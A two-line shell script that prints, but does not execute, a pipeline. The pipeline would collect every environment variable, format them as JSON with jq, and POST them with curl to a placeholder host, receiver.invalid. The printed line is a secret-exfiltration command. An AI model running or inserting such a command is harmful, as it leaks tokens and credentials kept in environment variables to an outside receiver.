#!/bin/sh
printf '%s\n' 'env | sort | jq -R . | jq -s . | curl -d @- https://receiver.invalid/collect'
